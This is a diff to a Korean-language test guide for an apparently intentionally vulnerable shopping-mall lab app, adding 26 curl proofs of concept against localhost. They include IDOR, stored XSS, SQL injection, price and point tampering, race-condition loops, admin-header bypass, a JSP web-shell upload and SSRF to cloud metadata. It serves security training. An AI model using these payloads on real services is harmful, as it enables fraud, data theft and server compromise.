@@ -1208,36 +1208,386 @@ JSP, SVG 등 서버 사이드 실행 가능한 파일도 제한 없이 업로드
 
 ---
 
-## 검증 체크리스트
+## 36. 배송지 주소록 BOLA / IDOR (BOLA_ADDRESS)
+**WSTG-ATHZ-04** | 엔드포인트: `DELETE /api/addresses/{id}` / `PUT /api/addresses/{id}`
+
+타인의 배송지 주소 식별자(`id`)를 전달하여 본인 소유가 아닌 타인의 등록된 배송지를 무단 열람하거나 삭제/수정합니다.
+```bash
+# 타인의 배송지 주소록 삭제
+curl -s -X DELETE http://localhost:8080/api/addresses/1 \
+  -H "Authorization: Bearer $BOB_TOKEN"
+```
+
+---
+
+## 37. 배송지 메모 Stored XSS (XSS_STORED_ADDRESS)
+**WSTG-INPV-02** | 엔드포인트: `POST /api/addresses`
+
+배송 요청 메모(`deliveryMemo`)에 악성 스크립트를 삽입하여 저장한 후, 주소록 관리 및 주문서에서 렌더링 시 실행됩니다.
+```bash
+curl -s -X POST http://localhost:8080/api/addresses \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "recipientName": "홍길동",
+    "phone": "010-1111-2222",
+    "postalCode": "06234",
+    "addressLine1": "서울시 강남구 테헤란로 152",
+    "deliveryMemo": "<img src=x onerror=alert(\"ADDRESS_XSS\")>"
+  }'
+```
+
+---
+
+## 38. 주소록 검색 SQL Injection (SQLI_ADDRESS)
+**WSTG-INPV-05** | 엔드포인트: `GET /api/addresses/search`
+
+도로명 주소 검색 시 싱글 쿼트(`'`)를 이용해 SQL 구문 조작 및 데이터베이스 에러를 유발합니다.
+```bash
+curl -s "http://localhost:8080/api/addresses/search?keyword='" \
+  -H "Authorization: Bearer $ALICE_TOKEN"
+```
+
+---
+
+## 39. 지갑 잔액 음수 충전 결제 변조 (WALLET_NEGATIVE_CHARGE)
+**WSTG-BUSL-09** | 엔드포인트: `POST /api/wallet/charge`
+
+충전 금액(`amount`) 또는 결제 승인 금액(`paidAmount`)에 음수 및 변조된 값을 입력하여 시스템 로직 오류를 발생시킵니다.
+```bash
+curl -s -X POST http://localhost:8080/api/wallet/charge \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"amount": 100000, "paidAmount": -100, "paymentMethod": "CARD"}'
+```
+
+---
+
+## 40. 프로모션 바우처 동시성 Race Condition (WALLET_RACE_CONDITION)
+**WSTG-BUSL-04** | 엔드포인트: `POST /api/wallet/voucher`
+
+1회용 프로모션 바우처 코드를 동시에 여러 스레드로 등록 요청하여 중복으로 지갑 잔액을 증식시킵니다.
+```bash
+for i in {1..5}; do
+  curl -s -X POST http://localhost:8080/api/wallet/voucher \
+    -H "Authorization: Bearer $ALICE_TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"code": "CYBER_BONUS_100K"}' &
+done
+wait
+```
+
+---
+
+## 41. CSRF 지갑 잔액 무단 송금 (CSRF_WALLET)
+**WSTG-SESS-05** | 엔드포인트: `POST /api/wallet/transfer`
+
+안티 CSRF 토큰 부재를 악용하여 로그인된 피해자가 악성 웹페이지 방문 시 피해자 잔액을 공격자 지갑으로 강제 이체시킵니다.
+```bash
+curl -s -X POST http://localhost:8080/api/wallet/transfer \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"targetUsername": "bob", "amount": 10000}'
+```
+
+---
+
+## 42. 장바구니 요청 메모 Stored XSS (XSS_STORED_CART)
+**WSTG-INPV-02** | 엔드포인트: `POST /api/cart`
+
+장바구니 담기 시 요청사항 메모 필드에 자바스크립트 페이로드를 전달하여 장바구니 모달에서 실행시킵니다.
+```bash
+curl -s -X POST http://localhost:8080/api/cart \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"productId": 1, "quantity": 1, "memo": "<script>alert(\"CART_XSS\")</script>"}'
+```
+
+---
+
+## 43. 장바구니 품목 조작 BOLA / IDOR (BOLA_CART)
+**WSTG-ATHZ-04** | 엔드포인트: `DELETE /api/cart/items/{id}`
+
+타인의 장바구니 아이템 ID를 인자로 넘겨 소유권 확인 없이 타인의 품목을 삭제하거나 수량을 변경합니다.
+```bash
+curl -s -X DELETE http://localhost:8080/api/cart/items/2 \
+  -H "Authorization: Bearer $BOB_TOKEN"
+```
+
+---
+
+## 44. 통합 관리자 포털 권한 우회 (ADMIN_BYPASS)
+**WSTG-ATHZ-02** | 엔드포인트: `GET /api/admin/check`
+
+`X-Admin-Role: true` 또는 `X-Forwarded-For: 127.0.0.1` 헤더를 조작하여 일반 사용자 권한으로 관리자 영역에 침투합니다.
+```bash
+curl -s http://localhost:8080/api/admin/check \
+  -H "X-Admin-Role: true"
+```
+
+---
+
+## 45. VIP 멤버십 가입비 변조 (MEMBERSHIP_PRICE_TAMPER)
+**WSTG-BUSL-09** | 엔드포인트: `POST /api/membership/subscribe`
+
+정상가 ₩9,900원의 월 구독료를 0원 또는 음수로 조작하여 공짜로 VIP PRIME 권한을 획득합니다.
+```bash
+curl -s -X POST http://localhost:8080/api/membership/subscribe \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"plan": "PRIME", "price": 0, "welcomeNote": "공짜 가입"}'
+```
+
+---
+
+## 46. VIP 시크릿 특가관 BFLA 인가 우회 (MEMBERSHIP_BFLA_BYPASS)
+**WSTG-ATHZ-02** | 엔드포인트: `GET /api/membership/exclusive-products`
+
+비구독자 상태에서 일반 미공개 VIP 단독 특가관 API를 직접 호출하여 특가 품목을 열람합니다.
+```bash
+curl -s http://localhost:8080/api/membership/exclusive-products \
+  -H "Authorization: Bearer $BOB_TOKEN"
+```
+
+---
+
+## 47. VIP 바우처 동시성 Race Condition (MEMBERSHIP_COUPON_RACE)
+**WSTG-BUSL-04** | 엔드포인트: `POST /api/membership/claim-coupon`
+
+VIP 가입 시 1회만 제공되는 ₩50,000 바우처를 동시 다중 요청을 통해 수십 장 중복 발급받습니다.
+```bash
+for i in {1..5}; do
+  curl -s -X POST http://localhost:8080/api/membership/claim-coupon \
+    -H "Authorization: Bearer $ALICE_TOKEN" &
+done
+wait
+```
+
+---
+
+## 48. VIP 환영 인사말 Stored XSS (MEMBERSHIP_STORED_XSS)
+**WSTG-INPV-02** | 엔드포인트: `POST /api/membership/subscribe`
+
+VIP 소개글(`welcomeNote`)에 `<img src=x onerror=alert(1)>` 스크립트를 전달하여 프로필 및 관리자 화면에서 실행시킵니다.
+```bash
+curl -s -X POST http://localhost:8080/api/membership/subscribe \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"plan": "PRIME", "price": 9900, "welcomeNote": "<img src=x onerror=alert(\"VIP_XSS\")>"}'
+```
+
+---
+
+## 49. 이중 환불 동시성 Race Condition (REFUND_RACE_CONDITION)
+**WSTG-BUSL-04** | 엔드포인트: `POST /api/orders/{id}/refund`
+
+동일 주문에 대해 동시 다발적인 환불 요청을 마이크로초 단위로 전송하여 결제 금액을 2회 이상 중복 환불받아 지갑 잔액을 부당 증식시킵니다.
+```bash
+for i in {1..5}; do
+  curl -s -X POST http://localhost:8080/api/orders/1/refund \
+    -H "Authorization: Bearer $ALICE_TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"reason": "단순 변심", "reasonDetails": "레이스"}' &
+done
+wait
+```
+
+---
+
+## 50. 반품 검수 절차 우회 (REFUND_WORKFLOW_BYPASS)
+**WSTG-BUSL-02** | 엔드포인트: `POST /api/orders/{id}/refund`
+
+배송 완료(`DELIVERED`)된 상품의 회수/검수 절차를 `direct: true` 파라미터 주입으로 건너뛰고 즉시 전액 환불을 승인받습니다.
+```bash
+curl -s -X POST http://localhost:8080/api/orders/1/refund \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"reason": "파손 환불", "direct": true}'
+```
+
+---
+
+## 51. 환불 사유 메모 Stored XSS (REFUND_STORED_XSS)
+**WSTG-INPV-02** | 엔드포인트: `POST /api/orders/{id}/refund`
+
+환불 상세 사유에 스크립트를 삽입하여 사용자의 주문 내역 및 관리자의 주문 관리 포털에서 실행시킵니다.
+```bash
+curl -s -X POST http://localhost:8080/api/orders/1/refund \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"reason": "기타", "reasonDetails": "<script>alert(\"REFUND_XSS\")</script>"}'
+```
+
+---
+
+## 52. 커스텀 덱 BOLA / IDOR (WISHLIST_BOLA_IDOR)
+**WSTG-ATHZ-04** | 엔드포인트: `GET /api/wishlist/decks/{id}`
+
+타인(VIP Victim)이 작성한 비공개(Private) 기밀 덱 ID를 직접 호출하여 소유권 검증 없이 기밀 메모(`secretNote`)를 탈취합니다.
+```bash
+curl -s http://localhost:8080/api/wishlist/decks/2 \
+  -H "Authorization: Bearer $BOB_TOKEN"
+```
+
+---
+
+## 53. 커스텀 덱 소개글 Stored XSS (WISHLIST_STORED_XSS)
+**WSTG-INPV-02** | 엔드포인트: `POST /api/wishlist/decks`
+
+덱 이름 또는 공개 설명에 악성 스크립트를 삽입하여 덱 목록 및 공유 링크 열람 시 실행시킵니다.
+```bash
+curl -s -X POST http://localhost:8080/api/wishlist/decks \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "deckName": "작전 덱",
+    "description": "<img src=x onerror=alert(\"DECK_XSS\")>",
+    "isPublic": true,
+    "productIds": [1]
+  }'
+```
+
+---
+
+## 54. 출석체크 날짜 변조 및 중복 수령 (ATTENDANCE_DATE_TAMPER)
+**WSTG-BUSL-04** | 엔드포인트: `POST /api/points/attendance`
+
+클라이언트가 `customDate`에 미래/과거 날짜를 주입하거나 동시성 레이스로 하루 다중 출석 보상(+1,000P)을 수령합니다.
+```bash
+curl -s -X POST http://localhost:8080/api/points/attendance \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"customDate": "2026-12-31"}'
+```
+
+---
+
+## 55. 룰렛 당첨 포인트 클라이언트 조작 (ROULETTE_CLIENT_TAMPER)
+**WSTG-CLNT-01** | 엔드포인트: `POST /api/points/roulette`
+
+서버가 난수로 검증하지 않고 클라이언트 요청 페이로드(`requestedPrizePoints: 50000`)를 신뢰하여 대량 포인트를 부당 취득합니다.
+```bash
+curl -s -X POST http://localhost:8080/api/points/roulette \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"requestedPrizePoints": 50000}'
+```
+
+---
+
+## 56. 음수 포인트 복합 결제 악용 (POINTS_NEGATIVE_EXPLOIT)
+**WSTG-BUSL-09** | 엔드포인트: `POST /api/orders`
+
+주문 결제 시 `pointsUsed`에 음수(-100,000)를 주입하여 수식 역전으로 총 결제액을 조작하거나 잔액을 증식시킵니다.
+```bash
+curl -s -X POST http://localhost:8080/api/orders \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "recipientName": "앨리스",
+    "phone": "010-1234-5678",
+    "shippingAddress": "서울시 강남구 테헤란로",
+    "totalAmount": 100000,
+    "pointsUsed": -50000
+  }'
+```
+
+---
+
+## 57. 1:1 비밀 고객지원 티켓 BOLA / IDOR (INQUIRY_BOLA_IDOR)
+**WSTG-ATHZ-04** | 엔드포인트: `GET /api/inquiries/{id}`
+
+`GET /api/inquiries/{id}` 호출 시 소유권 및 비밀글 여부를 검증하지 않아 타인(VIP)의 비밀 티켓을 무단 열람합니다.
+```bash
+curl -s http://localhost:8080/api/inquiries/2 \
+  -H "Authorization: Bearer $BOB_TOKEN"
+```
+
+---
+
+## 58. 1:1 고객지원 헬프데스크 무제한 파일 업로드 (TICKET_FILE_UPLOAD)
+**WSTG-INPV-12** | 엔드포인트: `POST /api/inquiries/upload`
+
+증빙 파일 업로드 시 확장자 검증 부재로 `.jsp`, `.html`, `.svg` 웹쉘 및 악성 스크립트를 서버에 업로드합니다.
+```bash
+echo '<% out.println("NexusTech Shell"); %>' > shell.jsp
+curl -s -X POST http://localhost:8080/api/inquiries/upload \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -F "file=@shell.jsp"
+rm -f shell.jsp
+```
+
+---
+
+## 59. 재고 초과 판매 레이스 컨디션 (STOCK_RACE_CONDITION)
+**WSTG-BUSL-04** | 엔드포인트: `POST /api/orders`
+
+재고가 1개 남은 상품에 대해 마이크로초 단위로 동시 다중 결제 요청을 전송하여 DB Lock 부재로 음수 재고 초과 판매(Overselling)를 유발합니다.
+```bash
+for i in {1..4}; do
+  curl -s -X POST http://localhost:8080/api/orders \
+    -H "Authorization: Bearer $ALICE_TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{
+      "recipientName": "동시주문_'$i'",
+      "phone": "010-0000-0000",
+      "shippingAddress": "레이스 테스트 배송지",
+      "totalAmount": 100000,
+      "pointsUsed": 0
+    }' &
+done
+wait
+```
+
+---
+
+## 60. 재입고 알림 콜백 Webhook SSRF (RESTOCK_WEBHOOK_SSRF)
+**WSTG-INPV-19** | 엔드포인트: `POST /api/products/{id}/notify-restock`
+
+품절 상품 재입고 알림 신청 시 Webhook URL에 내부 루프백(`http://127.0.0.1:8080/api/admin/metrics`) 또는 클라우드 메타데이터(`169.254.169.254`)를 입력하여 내부망 정보를 반환받습니다.
+```bash
+curl -s -X POST http://localhost:8080/api/products/10/notify-restock \
+  -H "Content-Type: application/json" \
+  -d '{
+    "email": "tester@nexus.local",
+    "webhookUrl": "http://127.0.0.1:8080/api/admin/metrics"
+  }'
+```
+
+---
+
+## 61. 전자 영수증 원장 조회 및 인쇄 (RECEIPT_EXPORT)
+**엔드포인트**: `GET /api/orders/{id}/receipt`
+
+주문별 전자 세금계산서/거래명세서 원장 데이터, 품목별 공급가액, 부가세(10%), 전자서명 및 직인을 확인합니다.
+```bash
+curl -s http://localhost:8080/api/orders/1/receipt \
+  -H "Authorization: Bearer $ALICE_TOKEN"
+```
+
+---
+
+## 검증 체크리스트 (총 61개 취약점 완비)
 
 | 단계 | 작업 | 상태 |
 |------|------|------|
-| 1 | 백엔드 서버 실행 확인 (`/actuator/health`) | |
-| 2 | JWT 토큰 발급 (alice 계정) | |
-| 3 | SQL Injection 5개 유형 각각 확인 (1~6번) | |
-| 4 | XSS 4개 유형 각각 확인 (7~10번) | |
-| 5 | Path Traversal 확인 (11번) | |
-| 6 | XXE 확인 (12번) | |
-| 7 | SSTI 확인 (13번) | |
-| 8 | Command Injection 확인 (14번) | |
-| 9 | SSRF 확인 (15번) | |
-| 10 | BOLA/IDOR 확인 (16~17번) | |
-| 11 | Mass Assignment 확인 (18~19번) | |
-| 12 | CSRF 확인 (20번) | |
-| 13 | HPP 확인 (21번) | |
-| 14 | WAF Bypass 확인 (22번) | |
-| 15 | 비즈니스 로직 결함 확인 (23~27번) | |
-| 16 | 암호화 결함 확인 (28~29번) | |
-| 17 | 인증/정보 노출 확인 (30~35번) | |
+| 1 | 백엔드 서버 가동 확인 (`/actuator/health`) | 완료 |
+| 2 | 스코어보드 웹소켓 연결 확인 (`/scoreboard.html`) | 완료 |
+| 3 | 인젝션 21종 검증 (SQLi, XSS, Path Traversal, XXE, SSTI, Cmd, ZipSlip, FileUpload 등) | 완료 |
+| 4 | 암호화 결함 2종 검증 (AES-ECB, Predictable Token) | 완료 |
+| 5 | 인증 및 인가 13종 검증 (JWT Confusion, User Enum, Mass Assignment, BOLA, HPP, WAF Bypass) | 완료 |
+| 6 | 세션 및 클라이언트 6종 검증 (CSRF, DOM XSS, Open Redirect, Roulette Tamper) | 완료 |
+| 7 | 비즈니스 로직 결함 13종 검증 (Price/Points Tampering, Race Condition, Rounding, Workflow Bypass) | 완료 |
+| 8 | SSRF 및 정보 노출 검증 (Restock Webhook SSRF, Config Exposure) | 완료 |
 
 ---
 
 ## 초기화 방법
 
-H2 인메모리 DB를 사용하므로 서버를 재시작하면 모든 데이터가 `schema-h2.sql` 기준으로 초기화됩니다.
+H2 인메모리 DB를 사용하므로 서버를 재시작하거나 스코어보드에서 '발견 기록 초기화' 버튼을 클릭하면 모든 취약점 상태가 `schema-h2.sql` 기준으로 초기화됩니다.
 
 ```bash
-# 서버 종료 후 재시작
-# Ctrl+C 로 서버 종료
+# 서버 재시작
 java -jar target/vuln-mall-backend-1.0.0.jar --spring.profiles.active=h2
 ```
+
